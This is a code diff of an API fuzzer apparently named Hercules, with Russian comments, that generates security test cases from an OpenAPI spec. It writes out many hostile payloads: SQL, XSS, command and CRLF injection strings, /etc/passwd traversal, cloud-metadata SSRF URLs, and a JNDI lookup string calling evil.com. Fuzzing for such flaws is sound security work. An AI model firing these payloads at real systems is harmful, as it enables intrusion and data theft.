-  normalizeUrl(url) { 
-    return url.replace(/([^:]\/)\/+/g, "$1"); 
-  }
-
-  interpolateUrl(url, params) {
-    let result = url;
-    for (const [k, v] of Object.entries(params)) {
-      result = result.replace(`{${k}}`, encodeURIComponent(String(v)));
-    }
-    return result;
-  }
-
-  // ==================== ЗАГОЛОВКИ ====================
-
   getHeaders(operation) {
     const headers = {
       'Content-Type': 'application/json',
-      Accept: 'application/json',
-      'User-Agent': 'Hercules-Fuzzer/1.0'
+      'Accept': 'application/json',
+      'User-Agent': 'Hercules | Fuzz/2.0'
     };
     
     const security = operation.security || this.spec.security || [];
     for (const scheme of security) {
-      if (scheme.bearerAuth || scheme.apiKeyAuth) {
+      if (scheme.bearerAuth) {
         headers['Authorization'] = 'Bearer test-token-12345';
       }
-      if (scheme.apiKeyAuth?.in === 'header') {
-        headers[scheme.apiKeyAuth.name || 'X-API-Key'] = 'test-api-key-12345';
-      }
     }
+    
     return headers;
   }
 
-  _getMaliciousHeaders() {
-    const headersList = [
-      { 'X-Forwarded-For': '127.0.0.1, 192.168.1.1, 10.0.0.1', 'X-Real-IP': '0.0.0.0' },
-      { 'X-HTTP-Method-Override': 'POST', 'X-Method-Override': 'DELETE' },
-      { 'X-Original-URL': '/admin', 'X-Rewrite-URL': '/admin' },
-      { 'X-Request-ID': '<script>alert(1)</script>', 'X-Request-Id': "' OR '1'='1" },
-      { 'User-Agent': '"; DROP TABLE users; --', 'Referer': 'javascript:alert(1)' },
-      { 'Origin': 'https://evil.com', 'Cookie': 'session=<script>alert(1)</script>' },
-      { 'Authorization': 'Bearer <script>alert(1)</script>', 'Content-Type': 'application/xml' },
-      { 'Accept': '../etc/passwd', 'Host': 'evil.com' },
-      { 'X-API-Key': "' OR '1'='1", 'X-SSRF': 'http://169.254.169.254/latest/meta-data/' }
-    ];
-    return headersList[Math.floor(Math.random() * headersList.length)];
+  normalizeUrl(url) {
+    if (!url) return '';
+    return url.replace(/([^:]\/)\/+/g, "$1");
   }
 
-  _getLargeHeaders() {
-    const largeValue = 'A'.repeat(5000);
-    return {
-      'X-Large-Header': largeValue,
-      'X-Buffer-Overflow': 'A'.repeat(10000),
-      'X-Malicious': 'X'.repeat(4000) + '../'.repeat(500)
-    };
-  }
-
-  generateHeaderVariants(baseHeaders) {
-    return [
-      { ...baseHeaders, ...this._getMaliciousHeaders() },
-      { ...baseHeaders, ...this._getLargeHeaders() },
-      { ...baseHeaders, 'X-Empty': '', 'X-Null': null },
-      { ...baseHeaders, 'X-Duplicate': 'value1', 'X-Duplicate': 'value2' },
-      { ...baseHeaders, 'X-Special': '!@#$%^&*()', 'X-Unicode': 'Привет мир 🎉' },
-      { ...baseHeaders, 'X-Proto-Inject': 'HTTP/1.1 200 OK\r\n\r\n' },
-      { ...baseHeaders, 'X-Path': '../../../../etc/passwd' },
-      { ...baseHeaders, 'X-SQL': "' OR '1'='1' --" },
-      { ...baseHeaders, 'X-SSRF': 'http://169.254.169.254/' }
-    ];
-  }
-
-  // ==================== ГЕНЕРАЦИЯ PAYLOAD ====================
-
-  generateNormalPayload(operation) {
+  buildInjectionPayload(operation, injectionValue) {
     const result = { query: {}, path: {}, body: null };
-
-    for (const param of operation.parameters || []) {
-      const value = this.generatePayload(param.schema) ?? 'test';
-      if (param.in === 'query') result.query[param.name] = value;
-      if (param.in === 'path') result.path[param.name] = value;
-      if (param.in === 'body' && param.schema) result.body = this.generatePayload(param.schema);
+    
+    // PATH параметры
+    const pathParams = this.extractPathParams(operation.path);
+    for (const paramName of pathParams) {
+      result.path[paramName] = injectionValue;
     }
-
-    if (operation.requestBody) {
-      const content = operation.requestBody.content;
-      const jsonContent = content?.['application/json'] || content?.['application/merge-patch+json'];
-      if (jsonContent?.schema) result.body = this.generatePayload(jsonContent.schema);
+    
+    // QUERY параметры
+    const parameters = operation.parameters || [];
+    for (const param of parameters) {
+      if (param.in === 'query') {
+        result.query[param.name] = injectionValue;
+      }
     }
-
+    
+    // BODY
+    if (operation.requestBody && ['post', 'put', 'patch'].includes(operation.method)) {
+      result.body = { input: injectionValue, command: injectionValue };
+    }
+    
     return result;
   }
 
-  generateInjectionPayload(operation, basePathParams = {}) {
-    const result = { query: {}, body: null, path: { ...basePathParams } };
+/**
+ * Генерация тестов с мутацией заголовков
+ */
 
-    for (const param of operation.parameters || []) {
-      const payload = faker.helpers.arrayElement(INJECTION_PAYLOADS);
-      if (param.in === 'query') result.query[param.name] = payload;
-      if (param.in === 'path') result.path[param.name] = payload;
-    }
-
-    // Используем StructureMutator для глубоких инъекций
-    if (operation.requestBody || this._hasBodyParam(operation)) {
-      const body = this.generateNormalPayload(operation).body;
-      if (body && this.mutator) {
-        const mutated = JSON.parse(JSON.stringify(body));
-        this.mutator.recursiveInject(mutated, 'injection');
-        result.body = mutated;
-      } else if (body) {
-        this._injectIntoObject(body, INJECTION_PAYLOADS);
-        result.body = body;
-      }
-    }
-
-    const hasData = Object.keys(result.query).length > 0 || 
-                    Object.keys(result.path).length > 0 || 
-                    result.body;
-    return hasData ? result : null;
-  }
-
-  _hasBodyParam(operation) {
-    if (operation.requestBody) return true;
-    for (const param of operation.parameters || []) {
-      if (param.in === 'body') return true;
-    }
-    return false;
-  }
-
-  _injectIntoObject(obj, injections) {
-    if (!obj || typeof obj !== 'object') return;
-    for (const k of Object.keys(obj)) {
-      if (typeof obj[k] === 'string') {
-        obj[k] = faker.helpers.arrayElement(injections);
-      } else if (obj[k] && typeof obj[k] === 'object') {
-        this._injectIntoObject(obj[k], injections);
-      }
-    }
-  }
-
-  generateLargePayload(operation) {
-    const largeStr = faker.helpers.arrayElement(LARGE_PAYLOAD_VARIANTS)();
-    const result = { query: {}, path: {}, body: null };
-
-    for (const param of operation.parameters || []) {
-      const isId = param.name.toLowerCase().includes('id');
-      
-      if (isId) {
-        const val = faker.helpers.arrayElement(ID_BOUNDARY_VALUES);
-        if (param.in === 'query') result.query[param.name] = val;
-        if (param.in === 'path') result.path[param.name] = val;
-        continue;
-      }
-
-      if (param.in === 'query') result.query[param.name] = largeStr;
-      if (param.in === 'path') result.path[param.name] = largeStr;
-    }
-
-    // Используем StructureMutator для large payload
-    if (operation.requestBody || this._hasBodyParam(operation)) {
-      const base = this.generateNormalPayload(operation).body;
-      if (base && this.mutator) {
-        const mutated = JSON.parse(JSON.stringify(base));
-        this.mutator.recursiveInject(mutated, 'large');
-        result.body = mutated;
-      } else if (base) {
-        result.body = this._deepInjectLarge(base, largeStr);
-      }
-    }
-
-    if (Object.keys(result.query).length === 0 && 
-        Object.keys(result.path).length === 0 && !result.body) {
-      return { query: {}, path: {}, body: largeStr };
-    }
-
-    return result;
-  }
-
-  _deepInjectLarge(obj, value, depth = 0) {
-    if (depth > 5) return obj;
-    if (typeof obj === 'string') return value;
-    if (typeof obj === 'number') return 999999999;
-    if (typeof obj === 'boolean') return true;
-    if (Array.isArray(obj)) {
-      return obj.map(item => this._deepInjectLarge(item, value, depth + 1));
-    }
-    if (typeof obj === 'object' && obj !== null) {
-      const newObj = {};
-      for (const key of Object.keys(obj)) {
-        newObj[key] = this._deepInjectLarge(obj[key], value, depth + 1);
-      }
-      return newObj;
-    }
-    return obj;
-  }
-
-  generateMutationPayload(operation) {
-    const base = this.generateNormalPayload(operation);
-    
-    if (!base) {
-      return { query: {}, path: {}, body: this._randomJunk() };
-    }
-    
-    let mutatedBody = base.body;
-    
-    // Используем StructureMutator для продвинутой мутации
-    if (base.body && this.mutator) {
-      try {
-        mutatedBody = this.mutator.mutateObjectExtreme(
-          JSON.parse(JSON.stringify(base.body))
-        );
-      } catch (e) {
-        mutatedBody = this._mutateObject(base.body);
-      }
-    } else if (base.body) {
-      mutatedBody = this._mutateObject(base.body);
-    }
-    
-    return {
-      query: this._mutateObject(base.query),
-      path: this._mutateObject(base.path),
-      body: mutatedBody || this._randomJunk()
-    };
-  }
-
-  _mutateObject(obj, depth = 0) {
-    if (depth > 5) return obj;
-    const actions = ['delete', 'nullify', 'typeChange', 'duplicate', 'random', 'overflow', 'empty'];
-    const pick = () => faker.helpers.arrayElement(actions);
-
-    if (Array.isArray(obj)) {
-      return obj.map(x => this._mutateObject(x, depth + 1));
-    }
-    if (typeof obj !== 'object' || obj === null) {
-      return this._randomJunk();
-    }
-
-    const newObj = {};
-    for (const key of Object.keys(obj)) {
-      switch (pick()) {
-        case 'delete': continue;
-        case 'nullify': newObj[key] = null; break;
-        case 'typeChange': newObj[key] = this._changeType(obj[key]); break;
-        case 'duplicate': newObj[key] = [obj[key], obj[key]]; break;
-        case 'random': newObj[key] = this._randomJunk(); break;
-        case 'overflow': newObj[key] = 'A'.repeat(10000); break;
-        case 'empty': newObj[key] = ''; break;
-        default: newObj[key] = this._mutateObject(obj[key], depth + 1);
-      }
-    }
-
-    if (Math.random() > 0.7) newObj['__proto__'] = { polluted: true };
-    if (Math.random() > 0.7) newObj.unexpected_field = this._randomJunk();
-
-    return newObj;
-  }
-
-  _changeType(value) {
-    if (typeof value === 'string') return 123;
-    if (typeof value === 'number') return 'string_instead_of_number';
-    if (typeof value === 'boolean') return 'true';
-    return '???';
-  }
-
-  _randomJunk() {
-    return faker.helpers.arrayElement([
-      '<script>alert(1)</script>', "' OR 1=1--", '../../../../etc/passwd',
-      '', '🔥🔥🔥', null, 999999999, {}, [], true, false, 'null', 'undefined', 'NaN', 'Infinity'
-    ]);
-  }
-
-  // ==================== ГЕНЕРАЦИЯ ТЕСТОВ ====================
-
-  generateRateLimitTests(operation) {
-    const { baseUrl, path: pathUrl, method } = operation;
-    const testCases = [];
-
-    for (let i = 0; i < 100; i++) {
-      testCases.push({
-        id: `${method}_${pathUrl}_rate_rapid_${i}`,
-        method, url: this.normalizeUrl(`${baseUrl}${pathUrl}`),
-        path: pathUrl, type: 'rate_limit_rapid', delay: 0,
-        expectedStatus: [200, 429, 503]
+generateHeaderMutationVariants(baseHeaders) {
+  const variants = [];
+  
+  // Вредоносные значения для заголовков
+  const maliciousValues = {
+    injection: [
+      "' OR 1=1--",
+      "<script>alert(1)</script>",
+      "../../../etc/passwd",
+      "${jndi:ldap://evil.com/a}",
+      "test\r\nX-Injected: malicious",
+      "test%0d%0aX-Injected:%20malicious",
+      "'; DROP TABLE users; --",
+      "`id`",
+      "$(whoami)",
+      "| cat /etc/passwd"
+    ],
+    large: [
+      'A'.repeat(5000),
+      'B'.repeat(10000),
+      'X'.repeat(20000),
+      '🔥'.repeat(3000)
+    ],
+    extreme: [
+      null,
+      undefined,
+      123456789,
+      true,
+      false,
+      {},
+      [],
+      '',
+      '💥⚡🔥💀'
+    ]
+  };
+  
+  // Список заголовков для мутации
+  const headersToMutate = [
+    'User-Agent', 'Referer', 'Origin', 'Accept', 'Accept-Language',
+    'Accept-Encoding', 'X-Forwarded-For', 'X-Request-ID', 
+    'X-Custom-Header', 'X-API-Key', 'Cookie'
+  ];
+  
+  // 1. Инъекции в каждый заголовок по отдельности
+  for (const headerName of headersToMutate) {
+    for (const payload of maliciousValues.injection.slice(0, 3)) {
+      const mutatedHeaders = { ...baseHeaders };
+      mutatedHeaders[headerName] = payload;
+      variants.push({
+        type: `injection_${headerName}`,
+        headers: mutatedHeaders
       });
     }
-
-    const delays = [100, 50, 25, 10, 5, 2, 1, 0];
-    delays.forEach((delay, i) => {
-      testCases.push({
-        id: `${method}_${pathUrl}_rate_ramp_${i}`,
-        method, url: this.normalizeUrl(`${baseUrl}${pathUrl}`),
-        path: pathUrl, type: 'rate_limit_ramp',
-        delay, burstSize: 10, expectedStatus: [200, 429, 503]
+  }
+  
+  // 2. Large заголовки
+  for (const headerName of headersToMutate.slice(0, 5)) {
+    for (const payload of maliciousValues.large.slice(0, 2)) {
+      const mutatedHeaders = { ...baseHeaders };
+      mutatedHeaders[headerName] = payload;
+      variants.push({
+        type: `large_${headerName}`,
+        headers: mutatedHeaders
       });
+    }
+  }
+  
+  // 3. Extreme значения
+  for (const headerName of headersToMutate.slice(0, 3)) {
+    for (const payload of maliciousValues.extreme) {
+      const mutatedHeaders = { ...baseHeaders };
+      mutatedHeaders[headerName] = payload;
+      variants.push({
+        type: `extreme_${headerName}`,
+        headers: mutatedHeaders
+      });
+    }
+  }
+  
+  // 4. CRLF инъекции
+  const crlfPayloads = [
+    'test\r\nX-Injected: true',
+    'test%0d%0aX-Injected:%20true',
+    'test\r\nSet-Cookie: injected=1'
+  ];
+  for (const payload of crlfPayloads) {
+    const mutatedHeaders = { ...baseHeaders };
+    mutatedHeaders['User-Agent'] = payload;
+    mutatedHeaders['X-CRLF-Test'] = payload;
+    variants.push({
+      type: 'crlf_injection',
+      headers: mutatedHeaders
     });
+  }
+  
+  // 5. Дополнительные вредоносные заголовки
+  const extraMaliciousHeaders = [
+    { 'X-Forwarded-For': '127.0.0.1, evil.com' },
+    { 'X-Original-URL': '/admin' },
+    { 'X-Rewrite-URL': '/admin' },
+    { 'X-HTTP-Method-Override': 'POST' },
+    { 'X-Forwarded-Host': 'evil.com' },
+    { 'Host': 'evil.com' },
+    { 'X-Forwarded-Proto': 'http' }
+  ];
+  
+  for (const extraHeader of extraMaliciousHeaders) {
+    const mutatedHeaders = { ...baseHeaders, ...extraHeader };
+    variants.push({
+      type: 'extra_malicious',
+      headers: mutatedHeaders
+    });
+  }
+  
+  // Ограничиваем количество вариантов, чтобы не было слишком много тестов
+  return variants.slice(0, 30);
+}
 
-    return testCases;
+generateHeaderMutationTests(method, pathUrl, fullUrl, operation, baseHeaders) {
+    const tests = [];
+    const normalPayload = this.generateNormalPayload(operation);
+    const finalUrl = this.interpolateUrl(fullUrl, normalPayload.path);
+    
+    // 1. Инъекции в заголовки
+    const injectionHeaders = this.mutator.mutateHeaders(baseHeaders, 'injection');
+    tests.push({
+        id: `${method}_${pathUrl}_headers_injection`,
+        method,
+        url: finalUrl,
+        path: pathUrl,
+        type: 'header_mutation',
+        subType: 'injection',
+        queryParams: normalPayload.query,
+        headers: injectionHeaders,
+        body: normalPayload.body,
+        payload: { type: 'header_injection', mutated: injectionHeaders }
+    });
+    
+    // 2. Large заголовки
+    const largeHeaders = this.mutator.mutateHeaders(baseHeaders, 'large');
+    tests.push({
+        id: `${method}_${pathUrl}_headers_large`,
+        method,
+        url: finalUrl,
+        path: pathUrl,
+        type: 'header_mutation',
+        subType: 'large',
+        queryParams: normalPayload.query,
+        headers: largeHeaders,
+        body: normalPayload.body,
+        payload: { type: 'header_large', mutated: largeHeaders }
+    });
+    
+    // 3. Extreme заголовки
+    const extremeHeaders = this.mutator.mutateHeaders(baseHeaders, 'extreme');
+    tests.push({
+        id: `${method}_${pathUrl}_headers_extreme`,
+        method,
+        url: finalUrl,
+        path: pathUrl,
+        type: 'header_mutation',
+        subType: 'extreme',
+        queryParams: normalPayload.query,
+        headers: extremeHeaders,
+        body: normalPayload.body,
+        payload: { type: 'header_extreme', mutated: extremeHeaders }
+    });
+    
+    // 4. Экстремальные заголовки (отдельный метод)
+    const extremeHeaders2 = this.mutator.generateExtremeHeaders();
+    tests.push({
+        id: `${method}_${pathUrl}_headers_extreme2`,
+        method,
+        url: finalUrl,
+        path: pathUrl,
+        type: 'header_mutation',
+        subType: 'extreme2',
+        queryParams: normalPayload.query,
+        headers: { ...baseHeaders, ...extremeHeaders2 },
+        body: normalPayload.body,
+        payload: { type: 'header_extreme2', mutated: extremeHeaders2 }
+    });
+    
+    return tests;
+}
+
+  buildLargePayload(operation, largeValue) {
+    const result = { query: {}, path: {}, body: null };
+    
+    // PATH параметры
+    const pathParams = this.extractPathParams(operation.path);
+    for (const paramName of pathParams) {
+      result.path[paramName] = largeValue;
+    }
+    
+    // QUERY параметры
+    const parameters = operation.parameters || [];
+    for (const param of parameters) {
+      if (param.in === 'query') {
+        result.query[param.name] = largeValue;
+      }
+    }
+    
+    // BODY
+    if (operation.requestBody && ['post', 'put', 'patch'].includes(operation.method)) {
+      result.body = { data: largeValue };
+    }
+    
+    return result;
   }
 
-  generateTestCases() {
-    const testCases = [];
-    const paths = this.spec.paths || {};
+  // ==================== ИСПРАВЛЕННЫЙ МЕТОД GENERATETESTCASES ====================
 
-    for (const [pathUrl, pathItem] of Object.entries(paths)) {
-      for (const [method, operation] of Object.entries(pathItem)) {
-        if (!['get', 'post', 'put', 'delete', 'patch'].includes(method)) continue;
+generateTestCases() {
+  writeLog('info', '🔍 Генерация тестов...');
+  const testCases = [];
+  const paths = this.spec.paths || {};
 
-        const fullUrl = this.normalizeUrl(`${this.baseUrl}${pathUrl}`);
-        const params = this._extractParams(operation);
-        const normal = this.generateNormalPayload(operation);
-        const baseHeaders = { ...this.getHeaders(operation), ...params.header };
-        
-        operation.path = pathUrl;
-        operation.method = method;
-        operation.baseUrl = this.baseUrl;
+  for (const [pathUrl, pathItem] of Object.entries(paths)) {
+    for (const [method, operation] of Object.entries(pathItem)) {
+      const allowedMethods = ['get', 'post', 'put', 'delete', 'patch'];
+      if (!allowedMethods.includes(method)) continue;
 
-        // Normal тест
-        testCases.push(this._createTestCase({
-          id: `${method}_${pathUrl}_normal`, method, url: this.interpolateUrl(fullUrl, params.path),
-          path: pathUrl, type: 'normal', queryParams: params.query, headers: baseHeaders,
-          body: normal.body, expectedStatus: EXPECTED_STATUS.normal
-        }));
-
-        // Header фаззинг
-        this.generateHeaderVariants(baseHeaders).forEach((headers, idx) => {
-          testCases.push(this._createTestCase({
-            id: `${method}_${pathUrl}_headers_${idx}`, method, url: this.interpolateUrl(fullUrl, params.path),
-            path: pathUrl, type: 'header_fuzzing', queryParams: params.query,
-            headers, body: normal.body, expectedStatus: EXPECTED_STATUS.header_fuzzing,
-            headerPayload: headers
-          }));
+      operation.path = pathUrl;
+      operation.method = method;
+      
+      const fullUrl = this.normalizeUrl(`${this.baseUrl}${pathUrl}`);
+      const baseHeaders = this.getHeaders(operation);
+      
+      // Получаем нормальный payload (включая path параметры)
+      const normalPayload = this.generateNormalPayload(operation);
+      const finalUrl = this.interpolateUrl(fullUrl, normalPayload.path);
+      
+      // ========== НОРМАЛЬНЫЙ ТЕСТ ==========
+      testCases.push({
+        id: `${method}_${pathUrl}_normal`,
+        method,
+        url: finalUrl,
+        path: pathUrl,
+        type: 'normal',
+        queryParams: normalPayload.query,
+        headers: { ...baseHeaders },
+        body: normalPayload.body,
+        payload: normalPayload
+      });
+      
+      // ========== INJECTION ТЕСТЫ ==========
+      // SQL
+      for (const payload of PAYLOADS.sql.error_based.slice(0, 3)) {
+        const injectionPayload = this.buildInjectionPayload(operation, payload);
+        const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
+        testCases.push({
+          id: `${method}_${pathUrl}_sql_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
+          method,
+          url: injectionUrl,
+          path: pathUrl,
+          type: 'injection',
+          category: 'sql',
+          queryParams: injectionPayload.query,
+          headers: { ...baseHeaders },
+          body: injectionPayload.body,
+          payload: payload
         });
-
-        // Injection тесты (с мутатором)
-        const injection = this.generateInjectionPayload(operation, params.path);
-        if (injection) {
-          testCases.push(this._createTestCase({
-            id: `${method}_${pathUrl}_injection`, method, url: this.interpolateUrl(fullUrl, injection.path),
-            path: pathUrl, type: 'injection', queryParams: injection.query,
-            headers: baseHeaders, body: injection.body, expectedStatus: EXPECTED_STATUS.injection,
-            injectionPayload: injection
-          }));
+      }
+      
+      // XSS
+      for (const payload of PAYLOADS.xss.reflected.slice(0, 3)) {
+        const injectionPayload = this.buildInjectionPayload(operation, payload);
+        const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
+        testCases.push({
+          id: `${method}_${pathUrl}_xss_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
+          method,
+          url: injectionUrl,
+          path: pathUrl,
+          type: 'injection',
+          category: 'xss',
+          queryParams: injectionPayload.query,
+          headers: { ...baseHeaders },
+          body: injectionPayload.body,
+          payload: payload
+        });
+      }
+      
+      // Command
+      for (const payload of PAYLOADS.command.linux.slice(0, 3)) {
+        const injectionPayload = this.buildInjectionPayload(operation, payload);
+        const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
+        testCases.push({
+          id: `${method}_${pathUrl}_cmd_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
+          method,
+          url: injectionUrl,
+          path: pathUrl,
+          type: 'injection',
+          category: 'command',
+          queryParams: injectionPayload.query,
+          headers: { ...baseHeaders },
+          body: injectionPayload.body,
+          payload: payload
+        });
+      }
+      
+      // Path Traversal
+      for (const payload of PAYLOADS.path.linux.slice(0, 3)) {
+        const injectionPayload = this.buildInjectionPayload(operation, payload);
+        const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
+        testCases.push({
+          id: `${method}_${pathUrl}_path_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
+          method,
+          url: injectionUrl,
+          path: pathUrl,
+          type: 'injection',
+          category: 'path',
+          queryParams: injectionPayload.query,
+          headers: { ...baseHeaders },
+          body: injectionPayload.body,
+          payload: payload
+        });
+      }
+      
+      // SSRF
+      for (const payload of PAYLOADS.ssrf.cloud_metadata) {
+        const injectionPayload = this.buildInjectionPayload(operation, payload);
+        const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
+        testCases.push({
+          id: `${method}_${pathUrl}_ssrf`,
+          method,
+          url: injectionUrl,
+          path: pathUrl,
+          type: 'injection',
+          category: 'ssrf',
+          queryParams: injectionPayload.query,
+          headers: { ...baseHeaders },
+          body: injectionPayload.body,
+          payload: payload
+        });
+      }
+      
+      // NoSQL
+      for (const payload of PAYLOADS.nosql.operators.slice(0, 3)) {
+        const injectionPayload = this.buildInjectionPayload(operation, payload);
+        const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
+        testCases.push({
+          id: `${method}_${pathUrl}_nosql`,
+          method,
+          url: injectionUrl,
+          path: pathUrl,
+          type: 'injection',
+          category: 'nosql',
+          queryParams: injectionPayload.query,
+          headers: { ...baseHeaders },
+          body: injectionPayload.body,
+          payload: payload
+        });
+      }
+      
+      // ========== XXE, GRAPHQL, SOAP ==========
+      for (const payload of PAYLOADS.xxe) {
+        testCases.push({
+          id: `${method}_${pathUrl}_xxe`,
+          method,
+          url: finalUrl,
+          path: pathUrl,
+          type: 'xxe',
+          headers: { ...baseHeaders, 'Content-Type': 'application/xml' },
+          body: payload,
+          payload: payload
+        });
+      }
+      
+      for (const payload of PAYLOADS.graphql) {
+        testCases.push({
+          id: `${method}_${pathUrl}_graphql`,
+          method,
+          url: finalUrl,
+          path: pathUrl,
+          type: 'graphql',
+          headers: { ...baseHeaders },
+          body: { query: payload },
+          payload: payload
+        });
+      }
+      
+      for (const payload of PAYLOADS.soap) {
+        testCases.push({
+          id: `${method}_${pathUrl}_soap`,
+          method,
+          url: finalUrl,
+          path: pathUrl,
+          type: 'soap',
+          headers: { ...baseHeaders, 'Content-Type': 'application/soap+xml' },
+          body: payload,
+          payload: payload
+        });
+      }
+      
+      // ========== HEADER INJECTION ==========
+      for (const headerPayload of PAYLOADS.header.crlf) {
+        testCases.push({
+          id: `${method}_${pathUrl}_header`,
+          method,
+          url: finalUrl,
+          path: pathUrl,
+          type: 'header_injection',
+          queryParams: normalPayload.query,
+          headers: { ...baseHeaders, 'User-Agent': headerPayload, 'X-Test-Header': headerPayload },
+          body: normalPayload.body,
+          payload: { header: headerPayload }
+        });
+      }
+      
+      // ========== МУТАЦИИ ЗАГОЛОВКОВ (НОВЫЙ БЛОК - ВСТАВИТЬ СЮДА) ==========
+      const headerMutationVariants = this.generateHeaderMutationVariants(baseHeaders);
+      for (const headerVariant of headerMutationVariants) {
+        testCases.push({
+          id: `${method}_${pathUrl}_headers_${headerVariant.type}`,
+          method,
+          url: finalUrl,
+          path: pathUrl,
+          type: 'header_mutation',
+          subType: headerVariant.type,
+          queryParams: normalPayload.query,
+          headers: headerVariant.headers,
+          body: normalPayload.body,
+          payload: { type: 'header_mutation', variant: headerVariant.type, mutated: headerVariant.headers }
+        });
+      }
+      // ========== LARGE PAYLOAD ==========
+      for (const largeStr of PAYLOADS.large.strings.slice(0, 2)) {
+        const largePayload = this.buildLargePayload(operation, largeStr);
+        const largeUrl = this.interpolateUrl(fullUrl, largePayload.path);
+        testCases.push({
+          id: `${method}_${pathUrl}_large`,
+          method,
+          url: largeUrl,
+          path: pathUrl,
+          type: 'large_payload',
+          queryParams: largePayload.query,
+          headers: { ...baseHeaders },
+          body: largePayload.body,
+          payload: { size: largeStr.length }
+        });
+      }
+      
+      // ========== МУТАЦИОННЫЕ ТЕСТЫ ==========
+      // Для BODY (если есть)
+      if (normalPayload.body && typeof normalPayload.body === 'object') {
+        // Mutation injection
+        const mutatedBody = JSON.parse(JSON.stringify(normalPayload.body));
+        this.mutator.recursiveInject(mutatedBody, 'injection');
+        testCases.push({
+          id: `${method}_${pathUrl}_mutation_body_injection`,
+          method,
+          url: finalUrl,
+          path: pathUrl,
+          type: 'mutation',
+          subType: 'body_injection',
+          queryParams: normalPayload.query,
+          headers: { ...baseHeaders },
+          body: mutatedBody,
+          payload: { original: normalPayload.body, mutated: mutatedBody }
+        });
+        
+        // Mutation large
+        const largeBody = JSON.parse(JSON.stringify(normalPayload.body));
+        this.mutator.recursiveInject(largeBody, 'large');
+        testCases.push({
+          id: `${method}_${pathUrl}_mutation_body_large`,
+          method,
+          url: finalUrl,
+          path: pathUrl,
+          type: 'mutation',
+          subType: 'body_large',
+          queryParams: normalPayload.query,
+          headers: { ...baseHeaders },
+          body: largeBody,
+          payload: { original: normalPayload.body, mutated: largeBody }
+        });
+        
+        // Extreme mutation
+        for (let i = 0; i < CONFIG.EXTREME_MUTATION_COUNT; i++) {
+          try {
+            const extremeBody = JSON.parse(JSON.stringify(normalPayload.body));
+            const mutated = this.mutator.mutateObjectExtreme(extremeBody, 0, CONFIG.MUTATION_DEPTH);
+            if (mutated) {
+              testCases.push({
+                id: `${method}_${pathUrl}_extreme_mutation_body_${i}`,
+                method,
+                url: finalUrl,
+                path: pathUrl,
+                type: 'extreme_mutation',
+                subType: 'body',
+                queryParams: normalPayload.query,
+                headers: { ...baseHeaders },
+                body: mutated,
+                payload: { original: normalPayload.body, mutated: mutated }
+              });
+            }
+          } catch (e) {
+            writeLog('debug', `Ошибка extreme мутации body: ${e.message}`);
+          }
         }
-
-        // Large тесты (с мутатором)
-        const large = this.generateLargePayload(operation);
-        if (large) {
-          testCases.push(this._createTestCase({
-            id: `${method}_${pathUrl}_large`, method, url: this.interpolateUrl(fullUrl, params.path),
-            path: pathUrl, type: 'large', queryParams: large.query,
-            headers: baseHeaders, body: large.body, expectedStatus: EXPECTED_STATUS.large,
-            largePayload: large
-          }));
+      }
+      
+      // ========== МУТАЦИИ ДЛЯ QUERY ПАРАМЕТРОВ ==========
+      if (normalPayload.query && Object.keys(normalPayload.query).length > 0) {
+        // Mutation query injection
+        const mutatedQuery = JSON.parse(JSON.stringify(normalPayload.query));
+        this.mutator.recursiveInject(mutatedQuery, 'injection');
+        testCases.push({
+          id: `${method}_${pathUrl}_mutation_query_injection`,
+          method,
+          url: finalUrl,
+          path: pathUrl,
+          type: 'mutation',
+          subType: 'query_injection',
+          queryParams: mutatedQuery,
+          headers: { ...baseHeaders },
+          body: normalPayload.body,
+          payload: { original: normalPayload.query, mutated: mutatedQuery }
+        });
+        
+        // Mutation query large
+        const largeQuery = JSON.parse(JSON.stringify(normalPayload.query));
+        this.mutator.recursiveInject(largeQuery, 'large');
+        testCases.push({
+          id: `${method}_${pathUrl}_mutation_query_large`,
+          method,
+          url: finalUrl,
+          path: pathUrl,
+          type: 'mutation',
+          subType: 'query_large',
+          queryParams: largeQuery,
+          headers: { ...baseHeaders },
+          body: normalPayload.body,
+          payload: { original: normalPayload.query, mutated: largeQuery }
+        });
+      }
+      
+      // ========== МУТАЦИИ ДЛЯ PATH ПАРАМЕТРОВ ==========
+      if (normalPayload.path && Object.keys(normalPayload.path).length > 0) {
+        // Mutation path injection
+        const mutatedPath = JSON.parse(JSON.stringify(normalPayload.path));
+        this.mutator.recursiveInject(mutatedPath, 'injection');
+        const mutatedPathUrl = this.interpolateUrl(fullUrl, mutatedPath);
+        testCases.push({
+          id: `${method}_${pathUrl}_mutation_path_injection`,
+          method,
+          url: mutatedPathUrl,
+          path: pathUrl,
+          type: 'mutation',
+          subType: 'path_injection',
+          queryParams: normalPayload.query,
+          headers: { ...baseHeaders },
+          body: normalPayload.body,
+          payload: { original: normalPayload.path, mutated: mutatedPath }
+        });
+        
+        // Mutation path large
+        const largePath = JSON.parse(JSON.stringify(normalPayload.path));
+        this.mutator.recursiveInject(largePath, 'large');
+        const largePathUrl = this.interpolateUrl(fullUrl, largePath);
+        testCases.push({
+          id: `${method}_${pathUrl}_mutation_path_large`,
+          method,
+          url: largePathUrl,
+          path: pathUrl,
+          type: 'mutation',
+          subType: 'path_large',
+          queryParams: normalPayload.query,
+          headers: { ...baseHeaders },
+          body: normalPayload.body,
+          payload: { original: normalPayload.path, mutated: largePath }
+        });
+      }
+      
+      // ========== ЕСЛИ НЕТ НИ BODY, НИ QUERY, НИ PATH - СОЗДАЕМ ТЕСТОВЫЕ ДАННЫЕ ==========
+      const hasNoData = (!normalPayload.body || Object.keys(normalPayload.body).length === 0) &&
+                        (!normalPayload.query || Object.keys(normalPayload.query).length === 0) &&
+                        (!normalPayload.path || Object.keys(normalPayload.path).length === 0);
+      
+      if (hasNoData) {
+        const testData = { test: 'value', id: 1, name: 'test', data: { nested: 'value' } };
+        
+        // Мутация для тела
+        const mutatedTestBody = JSON.parse(JSON.stringify(testData));
+        this.mutator.recursiveInject(mutatedTestBody, 'injection');
+        testCases.push({
+          id: `${method}_${pathUrl}_mutation_test_body`,
+          method,
